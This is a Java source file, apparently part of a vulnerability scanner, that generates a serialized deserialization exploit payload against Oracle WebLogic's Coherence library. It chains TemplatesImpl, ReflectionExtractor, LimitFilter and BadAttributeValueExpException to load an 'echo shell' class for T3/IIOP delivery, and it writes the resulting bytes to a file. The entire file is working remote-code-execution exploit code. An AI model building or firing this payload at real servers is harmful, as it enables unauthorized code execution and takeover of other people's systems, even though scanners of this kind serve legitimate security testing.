package com.gbw.scanner.plugins.scripts.weblogic.payload;

import com.gbw.scanner.plugins.scripts.weblogic.shell.GBWT3IIOPShell;
import com.gbw.scanner.utils.Gadgets;
import com.gbw.scanner.utils.Serializer;
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.filter.LimitFilter;
import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.GnuParser;
import org.apache.commons.cli.HelpFormatter;
import org.apache.commons.cli.Options;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;

public class GBWCoherencePayloadMain {

    public static byte[] makePayload(Class echoClass) throws Exception {

        Object templates = Gadgets.createTemplatesImpl(echoClass);
        //定义单次反射要调用的方法
        ValueExtractor valueExtractor = new ReflectionExtractor("getOutputProperties", new Object[0]);
        //构造LimitFilter实例，并将temp放入
        LimitFilter limitFilter = new LimitFilter();
        limitFilter.setTopAnchor(templates);
        BadAttributeValueExpException expException = new BadAttributeValueExpException(null);

        Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
        m_comparator.setAccessible(true);
        m_comparator.set(limitFilter, valueExtractor);

        Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
        m_oAnchorTop.setAccessible(true);
        m_oAnchorTop.set(limitFilter, templates);

        Field val = expException.getClass().getDeclaredField("val");
        val.setAccessible(true);
        val.set(expException, limitFilter);
        return Serializer.serialize(expException);
    }

    public static void main(String[] args) throws Exception {

        Options opts = new Options();
        opts.addOption("file",true,"payload file");
        opts.addOption("echoShell",true,"echo shell type");
        opts.addOption("help", false, "Print usage");

        CommandLine cliParser = new GnuParser().parse(opts, args);
        if(cliParser.hasOption("help")){

            new HelpFormatter().printHelp("GBWCoherenceMain", opts);
            System.exit(0);
        }

        String payloadFile = cliParser.getOptionValue("file");
        String echoShell = "t3IIOP";

        if(cliParser.hasOption("echoShell"))
            echoShell = cliParser.getOptionValue("echoShell");

        byte[] data = null;

        if(echoShell.equals("t3IIOP"))
            data = makePayload(GBWT3IIOPShell.class);

        if(data!=null&&data.length>0)
            Files.write(Paths.get(payloadFile),data);

        System.out.println("Make payload and write to file:"+payloadFile);
    }
}
